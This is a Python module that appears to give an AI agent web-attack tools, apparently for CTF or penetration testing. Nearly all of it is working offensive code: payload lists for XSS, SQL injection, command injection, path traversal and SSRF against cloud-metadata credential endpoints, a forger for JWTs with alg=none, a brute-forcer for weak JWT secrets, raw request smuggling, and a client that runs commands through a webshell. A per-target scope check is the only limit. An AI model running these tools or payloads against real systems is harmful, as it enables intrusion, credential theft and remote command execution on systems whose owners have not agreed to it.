"""Web 漏洞分析与利用工具：参数探测、CORS、JWT、WAF、上传、原始请求与 webshell。"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import ssl
import time
from typing import Any

import httpx
from langchain_core.tools import BaseTool, tool

from sssec.agent.runtime import AgentContext
from sssec.agent.toolkit import err, normalize_host, ok, safe_workspace_path, truncate_middle

FUZZ_PAYLOADS = [
    ("xss", "<script>alert(1)</script>"),
    ("xss", "\"><img src=x onerror=alert(1)>"),
    ("sqli", "'"),
    ("sqli", "' OR '1'='1"),
    ("sqli", "1' AND '1'='1"),
    ("ssti", "{{7*7}}"),
    ("ssti", "${7*7}"),
    ("lfi", "../../../../etc/passwd"),
    ("lfi", "....//....//....//etc/passwd"),
    ("cmd", ";id"),
    ("cmd", "|whoami"),
    ("redirect", "//example.com"),
    ("ssrf", "http://127.0.0.1:80/"),
    ("crlf", "%0d%0aX-SSsec-Test: 1"),
]

WAF_SIGNATURES = {
    "cloudflare": ["cloudflare", "cf-ray", "__cf_bm"],
    "akamai": ["akamai", "akamai-ghost"],
    "aws_waf": ["awswaf", "x-amzn-waf"],
    "imperva": ["imperva", "incap_ses"],
    "f5": ["big-ip", "x-wa-info"],
    "sucuri": ["sucuri", "x-sucuri-id"],
    "modsecurity": ["mod_security", "modsecurity", "not acceptable"],
    "wallarm": ["wallarm"],
    "safedog": ["safedog", "安全狗"],
    "yunsuo": ["yunsuo", "云锁"],
}


def _b64url_decode(value: str) -> bytes:
    padding = "=" * (-len(value) % 4)
    return base64.urlsafe_b64decode(value + padding)


def _b64url_encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode("ascii")


async def _request(
    client: httpx.AsyncClient,
    method: str,
    url: str,
    *,
    params: dict[str, Any] | None = None,
    data: dict[str, Any] | None = None,
    headers: dict[str, str] | None = None,
    files: Any = None,
) -> tuple[httpx.Response, str]:
    response = await client.request(
        method,
        url,
        params=params,
        data=data,
        headers=headers,
        files=files,
        follow_redirects=False,
    )
    raw = await response.aread()
    text = raw[:200_000].decode(response.encoding or "utf-8", errors="replace")
    return response, text


async def _param_fuzz(
    ctx: AgentContext,
    url: str,
    param: str,
    method: str = "GET",
    payloads: Any = None,
    insecure: bool = False,
) -> str:
    decision = ctx.check_url(url)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    method = method.upper().strip()
    if method not in ("GET", "POST"):
        return err("method 只支持 GET / POST")
    selected = FUZZ_PAYLOADS
    if payloads:
        if isinstance(payloads, str):
            selected = [("custom", item.strip()) for item in payloads.split("\n") if item.strip()]
        elif isinstance(payloads, (list, tuple)):
            selected = [("custom", str(item)) for item in payloads]
    selected = selected[: max(1, min(30, len(selected)))]
    timeout = max(5, int(ctx.settings.safety.network_timeout))
    results: list[dict[str, Any]] = []
    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), follow_redirects=False, verify=not insecure
    ) as client:
        try:
            started = time.perf_counter()
            baseline, baseline_text = await _request(
                client,
                method,
                url,
                params={param: "sssec-baseline"} if method == "GET" else None,
                data={param: "sssec-baseline"} if method == "POST" else None,
            )
            baseline_ms = int((time.perf_counter() - started) * 1000)
        except Exception as exc:
            return err(f"基线请求失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
        baseline_length = len(baseline_text)
        for category, payload in selected:
            started = time.perf_counter()
            try:
                response, text = await _request(
                    client,
                    method,
                    url,
                    params={param: payload} if method == "GET" else None,
                    data={param: payload} if method == "POST" else None,
                )
            except Exception as exc:
                results.append(
                    {
                        "category": category,
                        "payload": payload,
                        "error": f"{type(exc).__name__}: {truncate_middle(str(exc), 200)}",
                    }
                )
                continue
            elapsed = int((time.perf_counter() - started) * 1000)
            reflected = payload in text
            length_delta = len(text) - baseline_length
            status_changed = response.status_code != baseline.status_code
            interesting = reflected or status_changed or abs(length_delta) > 80 or elapsed > baseline_ms + 1500
            results.append(
                {
                    "category": category,
                    "payload": payload,
                    "status_code": response.status_code,
                    "length": len(text),
                    "length_delta": length_delta,
                    "reflected": reflected,
                    "elapsed_ms": elapsed,
                    "baseline_ms": baseline_ms,
                    "interesting": interesting,
                }
            )
    hits = [item for item in results if item.get("interesting")]
    return ok(
        {
            "url": url,
            "param": param,
            "method": method,
            "baseline_status": baseline.status_code,
            "baseline_length": baseline_length,
            "results": results,
            "hits": hits,
            "scope_matched": decision.matched,
            "scope_mode": decision.mode,
            "scope_warning": decision.warning,
        }
    )


async def _cors_check(
    ctx: AgentContext,
    url: str,
    origin: str = "https://evil.example",
    insecure: bool = False,
) -> str:
    decision = ctx.check_url(url)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    timeout = max(5, int(ctx.settings.safety.network_timeout))
    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), follow_redirects=False, verify=not insecure
    ) as client:
        try:
            response, _text = await _request(
                client, "GET", url, headers={"Origin": origin}
            )
            options, _ = await _request(
                client,
                "OPTIONS",
                url,
                headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "Authorization",
                },
            )
        except Exception as exc:
            return err(f"CORS 检测失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
    headers = {k.lower(): v for k, v in response.headers.items()}
    options_headers = {k.lower(): v for k, v in options.headers.items()}
    allow_origin = headers.get("access-control-allow-origin", "")
    allow_credentials = headers.get("access-control-allow-credentials", "").lower() == "true"
    reflected = allow_origin == origin or allow_origin == "*"
    misconfigured = bool(
        (allow_origin == "*" and allow_credentials)
        or (allow_origin == origin and allow_credentials)
        or allow_origin == "*"
    )
    return ok(
        {
            "url": url,
            "origin": origin,
            "status_code": response.status_code,
            "allow_origin": allow_origin,
            "allow_credentials": allow_credentials,
            "vary": headers.get("vary", ""),
            "preflight_status": options.status_code,
            "preflight_allow_origin": options_headers.get(
                "access-control-allow-origin", ""
            ),
            "preflight_allow_methods": options_headers.get(
                "access-control-allow-methods", ""
            ),
            "preflight_allow_headers": options_headers.get(
                "access-control-allow-headers", ""
            ),
            "reflected_origin": reflected,
            "misconfigured": misconfigured,
            "scope_matched": decision.matched,
            "scope_mode": decision.mode,
            "scope_warning": decision.warning,
        }
    )


def _jwt_analyze(
    ctx: AgentContext,
    token: str,
    secret: str = "",
    try_none: bool = False,
    try_common: bool = False,
) -> str:
    token = str(token or "").strip()
    if token.count(".") != 2:
        return err("JWT 格式无效：应包含 header.payload.signature 三段")
    if len(token) > 20000:
        return err("JWT 过长")
    try:
        header_raw, payload_raw, signature = token.split(".")
        header = json.loads(_b64url_decode(header_raw))
        payload = json.loads(_b64url_decode(payload_raw))
    except Exception as exc:
        return err(f"JWT 解码失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
    alg = str(header.get("alg") or "")
    result: dict[str, Any] = {
        "header": header,
        "payload": payload,
        "algorithm": alg,
        "signature_present": bool(signature),
        "expired": False,
        "none_algorithm": alg.lower() == "none",
    }
    exp = payload.get("exp")
    if isinstance(exp, (int, float)):
        result["expired"] = float(exp) < time.time()
        result["expires_in"] = int(float(exp) - time.time())
    if try_none and alg.lower() != "none":
        forged_header = dict(header)
        forged_header["alg"] = "none"
        forged = (
            _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
            + "."
            + _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            + "."
        )
        result["none_token"] = forged
    if secret and alg.upper().startswith("HS"):
        digest = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg.upper())
        if digest:
            expected = hmac.new(
                secret.encode(), f"{header_raw}.{payload_raw}".encode(), digest
            ).digest()
            result["secret_valid"] = hmac.compare_digest(
                _b64url_encode(expected), signature
            )
    if try_common:
        common = ["secret", "password", "key", "changeme", "jwt", "test", "admin", "123456"]
        matched = []
        digest = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg.upper())
        if digest:
            for candidate in common:
                expected = hmac.new(
                    candidate.encode(), f"{header_raw}.{payload_raw}".encode(), digest
                ).digest()
                if hmac.compare_digest(_b64url_encode(expected), signature):
                    matched.append(candidate)
        result["common_secret_matches"] = matched
    return ok(result)


async def _waf_detect(
    ctx: AgentContext,
    url: str,
    param: str = "q",
    insecure: bool = False,
) -> str:
    decision = ctx.check_url(url)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    probes = [
        ("baseline", "sssec-baseline"),
        ("sqli", "' OR '1'='1"),
        ("xss", "<script>alert(1)</script>"),
        ("lfi", "../../../../etc/passwd"),
        ("cmd", ";cat /etc/passwd"),
    ]
    timeout = max(5, int(ctx.settings.safety.network_timeout))
    observed: list[dict[str, Any]] = []
    vendor = ""
    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), follow_redirects=False, verify=not insecure
    ) as client:
        for name, value in probes:
            try:
                response, text = await _request(
                    client, "GET", url, params={param: value}
                )
            except Exception as exc:
                observed.append({"probe": name, "error": str(exc)[:200]})
                continue
            haystack = (
                " ".join(f"{k}: {v}" for k, v in response.headers.items())
                + " "
                + text[:5000]
            ).lower()
            matched = [key for key, signs in WAF_SIGNATURES.items() if any(sign in haystack for sign in signs)]
            if matched:
                vendor = matched[0]
            observed.append(
                {
                    "probe": name,
                    "status_code": response.status_code,
                    "length": len(text),
                    "server": response.headers.get("server", ""),
                    "waf_headers": [
                        key for key in response.headers if key.lower().startswith(("cf-", "x-", "server"))
                    ][:10],
                    "matched_vendor": matched,
                    "body_preview": truncate_middle(text, 300),
                }
            )
    statuses = {item.get("status_code") for item in observed if item.get("status_code")}
    lengths = [item.get("length") for item in observed if isinstance(item.get("length"), int)]
    differences = len(statuses) > 1 or (len(set(lengths)) > 1 and len(lengths) > 1)
    return ok(
        {
            "url": url,
            "param": param,
            "vendor": vendor,
            "detected": bool(vendor) or differences,
            "differences": differences,
            "probes": observed,
            "scope_matched": decision.matched,
            "scope_mode": decision.mode,
            "scope_warning": decision.warning,
        }
    )


async def _http_upload(
    ctx: AgentContext,
    url: str,
    path: str,
    field: str = "file",
    filename: str = "",
    extra_fields: dict[str, str] | None = None,
    insecure: bool = False,
) -> str:
    decision = ctx.check_url(url)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    try:
        target = safe_workspace_path(ctx.workspace, path)
    except ValueError as exc:
        return err(str(exc))
    if not target.exists() or not target.is_file():
        return err("上传文件不存在")
    data = target.read_bytes()
    if len(data) > 5 * 1024 * 1024:
        return err("文件超过 5 MB 上限")
    timeout = max(5, int(ctx.settings.safety.network_timeout))
    name = filename or target.name
    files = {field: (name, data, "application/octet-stream")}
    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), follow_redirects=False, verify=not insecure
    ) as client:
        try:
            response, text = await _request(
                client,
                "POST",
                url,
                data=extra_fields or {},
                files=files,
            )
        except Exception as exc:
            return err(f"上传失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
    return ok(
        {
            "url": url,
            "status_code": response.status_code,
            "headers": {k: v for k, v in response.headers.items() if len(v) <= 2000},
            "body": truncate_middle(text, 4000),
            "uploaded": name,
            "bytes": len(data),
        }
    )


async def _http_raw(
    ctx: AgentContext,
    host: str,
    port: int,
    request: str,
    tls: bool = False,
    timeout_ms: int = 3000,
    insecure: bool = False,
) -> str:
    host = normalize_host(host)
    if not host:
        return err("主机名无效")
    decision = ctx.check_host(host)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    try:
        port = int(port)
    except (TypeError, ValueError):
        return err("端口无效")
    if not 1 <= port <= 65535:
        return err("端口超出范围")
    payload = str(request or "")
    if not payload:
        return err("request 不能为空")
    if len(payload) > 100_000:
        return err("request 过长（上限 100000 字符）")
    if not payload.endswith("\r\n\r\n") and "\r\n\r\n" not in payload:
        payload += "\r\n\r\n"
    timeout = max(0.5, min(30.0, int(timeout_ms) / 1000.0))
    writer = None
    try:
        ssl_context = ssl.create_default_context() if tls else None
        if ssl_context is not None and insecure:
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(
                host,
                port,
                ssl=ssl_context,
                server_hostname=host if tls else None,
            ),
            timeout=timeout,
        )
        writer.write(payload.encode("latin-1", errors="replace"))
        await writer.drain()
        chunks: list[bytes] = []
        total = 0
        while total < 200_000:
            try:
                chunk = await asyncio.wait_for(reader.read(8192), timeout=timeout)
            except asyncio.TimeoutError:
                break
            if not chunk:
                break
            chunks.append(chunk)
            total += len(chunk)
        raw = b"".join(chunks)
        text = raw.decode("latin-1", errors="replace")
        head, _, body = text.partition("\r\n\r\n")
        lines = head.split("\r\n")
        status_line = lines[0] if lines else ""
        headers: dict[str, str] = {}
        for line in lines[1:]:
            if ":" in line:
                key, value = line.split(":", 1)
                headers[key.strip()] = value.strip()[:2000]
        return ok(
            {
                "host": host,
                "port": port,
                "tls": bool(tls),
                "status_line": status_line[:300],
                "status_code": _status_code(status_line),
                "headers": headers,
                "body": truncate_middle(body, 12000),
                "raw_preview": truncate_middle(text, 4000),
                "bytes": len(raw),
            }
        )
    except (OSError, asyncio.TimeoutError) as exc:
        return err(f"原始 HTTP 请求失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
    finally:
        if writer is not None:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass


def _status_code(status_line: str) -> int | None:
    parts = status_line.split()
    if len(parts) >= 2 and parts[1].isdigit():
        return int(parts[1])
    return None


async def _webshell_client(
    ctx: AgentContext,
    url: str,
    command: str,
    param: str = "cmd",
    method: str = "GET",
    password: str = "",
    extra_params: dict[str, str] | None = None,
    insecure: bool = False,
) -> str:
    decision = ctx.check_url(url)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    method = method.upper().strip()
    if method not in ("GET", "POST"):
        return err("method 只支持 GET / POST")
    values = dict(extra_params or {})
    values[param] = command
    if password:
        values.setdefault("password", password)
    timeout = max(5, int(ctx.settings.safety.network_timeout))
    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), follow_redirects=False, verify=not insecure
    ) as client:
        try:
            response, text = await _request(
                client,
                method,
                url,
                params=values if method == "GET" else None,
                data=values if method == "POST" else None,
            )
        except Exception as exc:
            return err(f"webshell 请求失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
    return ok(
        {
            "url": url,
            "method": method,
            "command": command,
            "param": param,
            "status_code": response.status_code,
            "output": truncate_middle(text, 12000),
            "length": len(text),
        }
    )


LFI_PAYLOADS = [
    ("linux", "../../../../etc/passwd"),
    ("linux", "....//....//....//etc/passwd"),
    ("linux", "..%2f..%2f..%2f..%2fetc%2fpasswd"),
    ("linux", "/etc/passwd"),
    ("linux", "php://filter/convert.base64-encode/resource=index.php"),
    ("windows", "..\\..\\..\\..\\windows\\win.ini"),
    ("windows", "C:\\Windows\\win.ini"),
    ("flag", "../../../../flag"),
    ("flag", "../../../../flag.txt"),
    ("flag", "/flag"),
    ("flag", "/challenge/flag.txt"),
]

SSRF_PAYLOADS = [
    ("metadata", "http://169.254.169.254/latest/meta-data/"),
    ("metadata", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("metadata", "http://100.100.100.200/latest/meta-data/"),
    ("localhost", "http://127.0.0.1:80/"),
    ("localhost", "http://localhost:80/"),
    ("localhost", "http://[::1]/"),
    ("file", "file:///etc/passwd"),
    ("gopher", "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0"),
]

API_PATHS = [
    "/swagger.json", "/openapi.json", "/api/swagger.json", "/api/openapi.json",
    "/v3/api-docs", "/api-docs", "/swagger-ui.html", "/swagger-ui/",
    "/api", "/api/v1", "/api/v2", "/graphql", "/api/graphql",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/.well-known/openapi.json", "/docs", "/redoc", "/wp-json/",
]


async def _lfi_probe(
    ctx: AgentContext,
    url: str,
    param: str,
    method: str = "GET",
    payloads: Any = None,
    insecure: bool = False,
) -> str:
    decision = ctx.check_url(url)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    method = method.upper().strip()
    if method not in ("GET", "POST"):
        return err("method 只支持 GET / POST")
    selected = LFI_PAYLOADS
    if payloads:
        if isinstance(payloads, str):
            selected = [("custom", item.strip()) for item in payloads.splitlines() if item.strip()]
        elif isinstance(payloads, (list, tuple)):
            selected = [("custom", str(item)) for item in payloads]
    selected = selected[:12]
    markers = ("root:x:0:0", "[extensions]", "flag{", "daemon:", "bin/bash", "cm9vdDp4OjA6MD")
    timeout = max(5, int(ctx.settings.safety.network_timeout))
    results: list[dict[str, Any]] = []
    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), follow_redirects=False, verify=not insecure
    ) as client:
        try:
            baseline, baseline_text = await _request(
                client, method, url,
                params={param: "sssec-baseline"} if method == "GET" else None,
                data={param: "sssec-baseline"} if method == "POST" else None,
            )
        except Exception as exc:
            return err(f"基线请求失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
        for category, payload in selected:
            try:
                response, text = await _request(
                    client, method, url,
                    params={param: payload} if method == "GET" else None,
                    data={param: payload} if method == "POST" else None,
                )
            except Exception as exc:
                results.append({"category": category, "payload": payload, "error": str(exc)[:300]})
                continue
            hit = [marker for marker in markers if marker in text]
            interesting = bool(hit) or response.status_code != baseline.status_code
            results.append(
                {
                    "category": category,
                    "payload": payload,
                    "status_code": response.status_code,
                    "length": len(text),
                    "length_delta": len(text) - len(baseline_text),
                    "markers": hit,
                    "interesting": interesting,
                    "preview": text[:600],
                }
            )
    return ok(
        {
            "url": url,
            "param": param,
            "method": method,
            "baseline_status": baseline.status_code,
            "results": results,
            "hits": [item for item in results if item.get("interesting")],
            "scope_matched": decision.matched,
            "scope_mode": decision.mode,
        }
    )


async def _ssrf_probe(
    ctx: AgentContext,
    url: str,
    param: str,
    method: str = "GET",
    payloads: Any = None,
    insecure: bool = False,
) -> str:
    decision = ctx.check_url(url)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    method = method.upper().strip()
    if method not in ("GET", "POST"):
        return err("method 只支持 GET / POST")
    selected = SSRF_PAYLOADS
    if payloads:
        if isinstance(payloads, str):
            selected = [("custom", item.strip()) for item in payloads.splitlines() if item.strip()]
        elif isinstance(payloads, (list, tuple)):
            selected = [("custom", str(item)) for item in payloads]
    selected = selected[:12]
    markers = (
        "ami-id", "instance-id", "security-credentials", "accesskeyid",
        "root:x:0:0", "100.100.100.200", "meta-data", "169.254.169.254",
    )
    timeout = max(5, int(ctx.settings.safety.network_timeout))
    results: list[dict[str, Any]] = []
    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), follow_redirects=False, verify=not insecure
    ) as client:
        try:
            baseline, baseline_text = await _request(
                client, method, url,
                params={param: "http://sssec.invalid/"} if method == "GET" else None,
                data={param: "http://sssec.invalid/"} if method == "POST" else None,
            )
        except Exception as exc:
            return err(f"基线请求失败：{type(exc).__name__}: {truncate_middle(str(exc), 300)}")
        for category, payload in selected:
            try:
                response, text = await _request(
                    client, method, url,
                    params={param: payload} if method == "GET" else None,
                    data={param: payload} if method == "POST" else None,
                )
            except Exception as exc:
                results.append({"category": category, "payload": payload, "error": str(exc)[:300]})
                continue
            hit = [marker for marker in markers if marker.lower() in text.lower()]
            changed = response.status_code != baseline.status_code or len(text) != len(baseline_text)
            results.append(
                {
                    "category": category,
                    "payload": payload,
                    "status_code": response.status_code,
                    "length": len(text),
                    "length_delta": len(text) - len(baseline_text),
                    "markers": hit,
                    "interesting": bool(hit) or changed,
                    "preview": text[:600],
                }
            )
    return ok(
        {
            "url": url,
            "param": param,
            "method": method,
            "baseline_status": baseline.status_code,
            "results": results,
            "hits": [item for item in results if item.get("interesting")],
            "scope_matched": decision.matched,
            "scope_mode": decision.mode,
        }
    )


async def _api_discover(
    ctx: AgentContext,
    base_url: str,
    paths: Any = None,
    insecure: bool = False,
) -> str:
    decision = ctx.check_url(base_url)
    if not decision.allowed:
        return err(f"目标范围拒绝：{decision.reason}")
    selected = API_PATHS
    if paths:
        if isinstance(paths, str):
            selected = [item.strip() for item in paths.splitlines() if item.strip()]
        elif isinstance(paths, (list, tuple)):
            selected = [str(item) for item in paths]
    selected = selected[:40]
    timeout = max(5, int(ctx.settings.safety.network_timeout))
    base = base_url.rstrip("/")
    results: list[dict[str, Any]] = []
    async with httpx.AsyncClient(
        timeout=httpx.Timeout(timeout), follow_redirects=False, verify=not insecure
    ) as client:
        for path in selected:
            path = path if path.startswith("/") else "/" + path
            target = base + path
            try:
                response, text = await _request(client, "GET", target)
            except Exception as exc:
                results.append({"path": path, "error": str(exc)[:300]})
                continue
            lower = text.lower()
            markers = [
                marker for marker in ("swagger", "openapi", "graphql", "actuator", "api", "spring")
                if marker in lower
            ]
            results.append(
                {
                    "path": path,
                    "status_code": response.status_code,
                    "content_type": response.headers.get("content-type", ""),
                    "length": len(text),
                    "markers": markers,
                    "interesting": response.status_code in (200, 401, 403) and bool(markers or len(text) > 20),
                    "preview": text[:500],
                }
            )
    return ok(
        {
            "base_url": base_url,
            "results": results,
            "hits": [item for item in results if item.get("interesting")],
            "scope_matched": decision.matched,
            "scope_mode": decision.mode,
        }
    )


def build_web_tools(ctx: AgentContext) -> dict[str, BaseTool]:
    @tool("param_fuzz")
    async def param_fuzz(
        url: str,
        param: str,
        method: str = "GET",
        payloads: Any = None,
        insecure: bool = False,
    ) -> str:
        """对单个参数做 XSS/SQLi/SSTI/LFI/命令注入/SSRF/重定向探测，比较状态码、长度、反射与耗时。"""
        return await _param_fuzz(ctx, url, param, method, payloads, insecure)

    @tool("lfi_probe")
    async def lfi_probe(
        url: str,
        param: str,
        method: str = "GET",
        payloads: Any = None,
        insecure: bool = False,
    ) -> str:
        """针对单参数做路径穿越/本地文件包含探测，覆盖 Linux/Windows/flag 路径与 php filter。"""
        return await _lfi_probe(ctx, url, param, method, payloads, insecure)

    @tool("ssrf_probe")
    async def ssrf_probe(
        url: str,
        param: str,
        method: str = "GET",
        payloads: Any = None,
        insecure: bool = False,
    ) -> str:
        """针对单参数做 SSRF 探测：云元数据、localhost、file/gopher 回连，比较状态与响应标记。"""
        return await _ssrf_probe(ctx, url, param, method, payloads, insecure)

    @tool("api_discover")
    async def api_discover(
        base_url: str,
        paths: Any = None,
        insecure: bool = False,
    ) -> str:
        """枚举 Swagger/OpenAPI/GraphQL/Actuator/API 文档等常见接口，返回状态、类型、长度与命中。"""
        return await _api_discover(ctx, base_url, paths, insecure)

    @tool("cors_check")
    async def cors_check(
        url: str,
        origin: str = "https://evil.example",
        insecure: bool = False,
    ) -> str:
        """检查 CORS 配置：ACAO 反射、通配符 + Credentials、预检方法/头。"""
        return await _cors_check(ctx, url, origin, insecure)

    @tool("jwt_analyze")
    def jwt_analyze(
        token: str,
        secret: str = "",
        try_none: bool = False,
        try_common: bool = False,
    ) -> str:
        """解码 JWT，检查 alg/exp/claims；可验证 HMAC secret、生成 alg=none 令牌、尝试常见弱密钥。"""
        return _jwt_analyze(ctx, token, secret, try_none, try_common)

    @tool("waf_detect")
    async def waf_detect(
        url: str,
        param: str = "q",
        insecure: bool = False,
    ) -> str:
        """发送基线与少量攻击字符串，识别 WAF 指纹与响应差异。"""
        return await _waf_detect(ctx, url, param, insecure)

    @tool("http_upload")
    async def http_upload(
        url: str,
        path: str,
        field: str = "file",
        filename: str = "",
        extra_fields: dict[str, str] | None = None,
        insecure: bool = False,
    ) -> str:
        """把工作区文件以 multipart/form-data 上传到目标 URL。"""
        return await _http_upload(ctx, url, path, field, filename, extra_fields, insecure)

    @tool("http_raw")
    async def http_raw(
        host: str,
        port: int,
        request: str,
        tls: bool = False,
        timeout_ms: int = 3000,
        insecure: bool = False,
    ) -> str:
        """发送原始 HTTP 请求（可构造畸形/分块/走私请求），返回状态行、响应头与响应体。"""
        return await _http_raw(ctx, host, port, request, tls, timeout_ms, insecure)

    @tool("webshell_client")
    async def webshell_client(
        url: str,
        command: str,
        param: str = "cmd",
        method: str = "GET",
        password: str = "",
        extra_params: dict[str, str] | None = None,
        insecure: bool = False,
    ) -> str:
        """通过 GET/POST 参数向 webshell 发送命令并取回输出（AWD/CTF 常用）。"""
        return await _webshell_client(
            ctx, url, command, param, method, password, extra_params, insecure
        )

    return {
        "param_fuzz": param_fuzz,
        "lfi_probe": lfi_probe,
        "ssrf_probe": ssrf_probe,
        "api_discover": api_discover,
        "cors_check": cors_check,
        "jwt_analyze": jwt_analyze,
        "waf_detect": waf_detect,
        "http_upload": http_upload,
        "http_raw": http_raw,
        "webshell_client": webshell_client,
    }


__all__ = ["build_web_tools"]
